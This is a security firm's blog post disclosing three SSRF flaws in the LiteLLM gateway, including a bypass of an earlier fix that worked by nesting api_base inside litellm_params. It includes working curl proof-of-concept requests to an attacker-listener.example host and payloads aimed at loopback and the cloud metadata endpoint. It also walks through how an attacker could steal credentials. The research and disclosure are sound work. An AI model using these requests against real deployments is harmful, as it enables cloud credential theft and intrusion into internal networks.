---
schema_version: "1.0.0"
document_id: "39927948d2b99e403ca7e2a721025e42cb5f7fcfd376d7079c67e7bbad47e936"
company_key: "yc-escape"
company: "Escape"
source_id: "yc-escape-rss-d1370620bfa7"
canonical_url: "https://escape.tech/blog/how-escape-exploited-ssrf-in-litellm/"
published_at: "2026-05-01T14:55:23+00:00"
first_seen_at: "2026-07-20T23:23:55.281376+00:00"
fetched_at: "2026-07-28T21:44:49.635544+00:00"
content_hash: "sha256:8a20e1f66b38b024a3e757eb0eebeaaa411bb72b5be4aa0f6ba2e8054de0eebe"
---

# How Escape AI Pentesting Exploited SSRF in LiteLLM

At Escape, we routinely test the AI infrastructure that teams deploy inside their cloud environments.


LLM gateways, RAG pipelines, model proxies: these are services that make outbound HTTP requests by design, which makes them natural targets for SSRF.


When we looked at LiteLLM, **we found three confirmed SSRF sinks** , a security gate that was specifically built to prevent this exact bug class, and a bypass that means the gate itself is broken. The organization has confirmed to our research team that the vulnerability has existed and was already tracked internally.


---


## What we looked at and why


LiteLLM is the LLM gateway a lot of teams reach for when they want one API in front of OpenAI, Anthropic, Bedrock, and a dozen other providers. It's a proxy, which means its job description is "take instructions from clients and make outbound HTTP requests on their behalf." That's a description that should make any application-security person sit up, because proxies are SSRF factories by default, and the only thing standing between "feature" and "vulnerability" is how carefully the destination of those outbound requests is validated.


We deployed LiteLLM against PostgreSQL on a self-hosted instance, created a non-admin user, and went looking for endpoints where a client controls a URL that the server will fetch.


There were a lot of candidates: health checks, connection testers, RAG ingestion, MCP server registration, webhook callbacks. The interesting question wasn't "can we find one", it was "which ones actually fetch, and what guards exist where?"


## What we found and how


Three confirmed SSRF sinks. One reachable by any authenticated user, two requiring admin. All three reach loopback and cloud-metadata addresses with no destination validation. And, the part that turned this from a routine bug report into a story, a security gate that was specifically built to prevent this exact bug class, in response to a prior bounty report, that doesn't actually work.


The methodology was deliberately boring: stand up an HTTP listener on a host the LiteLLM server can reach, send each candidate endpoint a request pointing at that listener, and watch the listener log. Either a request arrives or it doesn't. Hangs and timeouts are suggestive but not proof; a line in the listener log is proof. This choice paid off after the first attempt, pointing` /v1/rag/ingest` at` 169.254.169.254` and watching it hang for five seconds, turned out to be a red herring (the request was failing input validation before reaching the fetch path; the "hang" was something else entirely).


Listener-first methodology saved us from writing up a false positive.


## Sink 1:` /v1/rag/ingest` , blind SSRF, any authenticated user


This is the primary finding. The RAG ingestion endpoint accepts a JSON body with a` file_url` field and an` ingest_options` block. Any authenticated user can hit it, no admin privileges required. With a valid body and an attacker-controlled URL:


```text
curl -X POST https://<target>/v1/rag/ingest \
-H "Authorization: Bearer <user-key>" \
-H "Content-Type: application/json" \
-d '{
"file_url": "https://attacker-listener.example/ssrf-rag-proof.txt",
"ingest_options": {"vector_store": {"custom_llm_provider": "openai"}}
}'


```


In the listener:


```text
[10/Apr/2026 18:49:21] "GET /ssrf-rag-proof.txt HTTP/1.1" 404 -


```


That line is the entire finding in microcosm. The LiteLLM server reached out to a URL we picked, with a path we picked, on a host we picked. No validation, no allowlist, no scheme restriction. A regular user API key is all that's needed.


The code path confirms the absence of any guard. In` litellm/proxy/rag_endpoints/endpoints.py` , the handler passes` file_url` straight to` litellm.aingest()` , which reaches` litellm/rag/ingestion/base_ingestion.py` :


```text
if file_url:
http_client = get_async_httpx_client(llm_provider=httpxSpecialProvider.RAG)
response = await http_client.get(file_url)  # no validation


```


No destination check. No allowlist. The` allow_client_side_credentials` gate doesn't apply here because it only inspects top-level` api_base` /` base_url` keys, and this endpoint uses` file_url` .


Pointing the same endpoint at restricted addresses confirmed there's no egress filtering at all:


```text
# Loopback
"file_url": "http://127.0.0.1:1/probe"
# → "litellm.APIConnectionError: Cannot connect to host 127.0.0.1:1"
# (the error references the loopback address, the server tried)


# Link-local cloud metadata
"file_url": "http://169.254.169.254/latest/meta-data/"
# → "litellm.APIConnectionError: Connection timeout to host http://169.254.169.254/latest/meta-data/"
# (timeout because the test instance isn't on AWS, but on AWS this reaches IMDS)


```


The error messages literally name the destinations. On any AWS, GCP, or Azure deployment of LiteLLM, this reaches the instance metadata service and exfiltrates cloud credentials.


## Sink 2:` /search_tools/test_connection` , SSRF via gate bypass, admin only


This is the finding that changes the story. The` /search_tools/test_connection` endpoint was already patched in response to a prior huntr.com bounty (4001e1a2-7b7a-4776-a3ae-e6692ec3d997). A gate called` allow_client_side_credentials` was added to block user-supplied` api_base` values. If you send` api_base` as a top-level key, you get a clear rejection:


```text
{"error":{"message":"Authentication Error, Rejected Request: api_base is not allowed in request body. Enable with `general_settings::allow_client_side_credentials` on proxy config.yaml."}}


```


The fix exists. It shipped. The maintainers know about this bug class.


But the gate only checks top-level keys. The check lives in` litellm/proxy/auth/auth_utils.py` (` is_request_body_safe` ):


```text
banned_params = ["api_base", "base_url"]
for param in banned_params:
if param in request_body:   # flat top-level check only
...


```


The endpoint accepts` api_base` nested inside` litellm_params` . Nesting it bypasses the gate entirely:


```text
curl -X POST https://<target>/search_tools/test_connection \
-H "Authorization: Bearer <user-key>" \
-H "Content-Type: application/json" \
-d '{
"litellm_params": {
"api_base": "https://attacker-listener.example/search-test",
"search_provider": "tavily",
"model": "openai/test",
"api_key": "test"
}
}'


```


The server reaches out to the attacker-controlled URL (with` /search` appended by the handler for the tavily provider). The endpoint itself is admin-gated: a non-admin key gets a 403 at the auth layer before the handler ever runs, so the privilege bar here matches` /health/test_connection` rather than` /v1/rag/ingest` .


That admin requirement narrows who can trigger this, but it doesn't rescue the gate. This isn't just "the fix didn't propagate to sibling endpoints." The fix itself is broken on the endpoint it was designed to protect. The prior bounty's mitigation can be bypassed by anyone with an admin key who reads the request schema and notices that` api_base` goes inside` litellm_params` , not at the top level. A defense specifically built to prevent client-controlled` api_base` destinations fails on its home turf, and the SSRF primitive it was supposed to kill, authenticated outbound fetch from the LiteLLM host into internal networks and cloud metadata endpoints, is still live.


## Sink 3:` /health/test_connection` , full-read SSRF, admin only


The third sink is the most powerful but has the highest privilege bar: it requires the master key (PROXY_ADMIN role). The health-check endpoint accepts an` api_base` URL inside` litellm_params` :


```text
curl -X POST https://<target>/health/test_connection \
-H "Authorization: Bearer <admin-key>" \
-H "Content-Type: application/json" \
-d '{"litellm_params":{"api_base":"https://attacker-listener.example/health-probe","model":"openai/test","api_key":"test"}}'


```


Listener output:


```text
[10/Apr/2026 18:50:29] "POST /health-probe/chat/completions HTTP/1.1" 501 -


```


The server makes a POST with` /chat/completions` appended. But here's what makes this sink different: the LiteLLM response to the attacker contains the upstream response body verbatim:


```text
"error": "litellm.APIError: APIError: OpenAIException - <!DOCTYPE HTML>
<html lang=\"en\">
<head><meta charset=\"utf-8\"><title>Error response</title></head>
<body>
<h1>Error response</h1>
<p>Error code: 501</p>
<p>Message: Unsupported method ('POST').</p>
...


```


That's the listener's 501 error page, returned through LiteLLM. It's a full-read SSRF. An attacker can read the response body of any internal HTTP service that responds at` <base>/chat/completions` . The path suffix is forced, but most internal services return something at any path, and a 404 with revealing headers is enough to fingerprint infrastructure.


The same` is_request_body_safe` bypass applies here:` api_base` is nested inside` litellm_params` , so the gate never fires. But the admin requirement is an independent check that does work (` can_user_make_model_call()` enforces PROXY_ADMIN role), limiting practical exposure.


The admin requirement reduces but doesn't eliminate the risk. Admin key ≠ cloud credentials. An attacker with the LiteLLM master key can use this endpoint to pivot into the cloud account hosting the instance (via IMDS credential theft), a privilege escalation the admin key was never intended to grant.


## What didn't pan out


` /mcp-rest/test/connection` returned generic "Failed to connect to MCP server" errors but never produced a single packet at the listener, not on a Python HTTP server, not on raw` nc` . It's failing inside an[MCP](https://escape.tech/blog/mcp-endpoint-discovery-attack-surface-management/) client library before any network traffic leaves the process, probably because it expects WebSocket transport. We dropped it. Reproducing-or-dropping is non-negotiable; a "probably SSRF" finding in a writeup is just a way to give reviewers ammunition.


## The root cause: a flat check in a nested world


All three sinks trace back to the same root cause. The` is_request_body_safe` function in` litellm/proxy/auth/auth_utils.py` checks whether` api_base` or` base_url` appear as top-level keys in the request body. But every endpoint that accepts these values nests them inside a child object (` litellm_params` , or uses a different field name entirely like` file_url` ). The gate was built for a flat request schema and deployed into a codebase that uses nested schemas everywhere.


This is a textbook example of a defense that was scoped to one endpoint's request shape and then expected to generalize. It didn't. The result is three unguarded SSRF sinks, including on the exact endpoint the gate was supposed to protect.


## Impact


The primary risk is authenticated SSRF from any user-level API key, on a service designed to run inside cloud VPCs. Concretely, an attacker who can authenticate to LiteLLM with a regular user key can:


- Reach the cloud instance metadata service on AWS / GCP / Azure deployments via` /v1/rag/ingest` . From IMDSv1 or a misconfigured IMDSv2, that's instance role credentials and lateral movement into the cloud account hosting LiteLLM.
- Enumerate and reach internal services on the host's local and private networks: Redis, Postgres admin endpoints, Kubernetes API server, internal HTTP APIs that trust source IP for auth.
- Use LiteLLM as a request laundering proxy to bypass egress firewalls that allow the LiteLLM host but not arbitrary clients.


An attacker who additionally holds the admin master key can escalate further via` /search_tools/test_connection` and` /health/test_connection` , with the latter returning upstream response bodies, enabling content extraction from internal HTTP services, not just reachability probing.


The authentication bar is low. LiteLLM's default deployment model issues[API keys](https://escape.tech/blog/how-to-secure-api-secret-keys/) broadly to internal users, and a separate finding in the same assessment showed that the session JWT contains a silently-provisioned API key for every authenticated UI user, meaning an[XSS](https://escape.tech/blog/csrf-vs-xss/) or browser extension yields a key that grants SSRF without the victim ever knowing they had an API key to steal.


## Takeaway


LLM gateways sit at the intersection of "must make outbound requests" and "runs inside trusted networks." That combination makes SSRF the default condition, not an edge case. The interesting part of this finding is not that LiteLLM had SSRF sinks. It's that a gate was built to prevent them, and the gate doesn't work because it checks the wrong level of the request body.


Three confirmed sinks. A prior fix for the same issue. And a flat check in a nested world that leaves the door open anyway.


These are the kinds of vulnerabilities that the[Escape AI Pentesting](https://escape.tech/product/ai-pentesting) solution is designed to surface: broken security gates, bypassed patches, and SSRF sinks hiding behind validation that looks correct but fails at runtime.


If you're deploying LLM infrastructure inside your cloud, the question is not whether your proxy can make outbound requests. It's whether anything meaningful stops an attacker from choosing where those requests go.


---


💡 **Want to learn further?** Explore these guides to learn more about novel vulnerabilities, optimize your workflows, and explore alternatives to existing solutions:


- [Fixing Vulnerabilities Directly in your IDE with Escape MCP](https://escape.tech/blog/fixing-vulnerabilities-directly-in-your-ide/)
- [Apple's App Store Source Map Leak: A Preventable Vulnerability We Found in 70% of Organizations](https://escape.tech/blog/apple-app-store-source-map-leak/)
- [How to Implement Multi-User Testing in DAST: Real-World Examples](https://escape.tech/blog/multi-user-dast-testing-real-world-examples/)
- [Top XBOW Alternatives](https://escape.tech/blog/xbow-alternatives/)
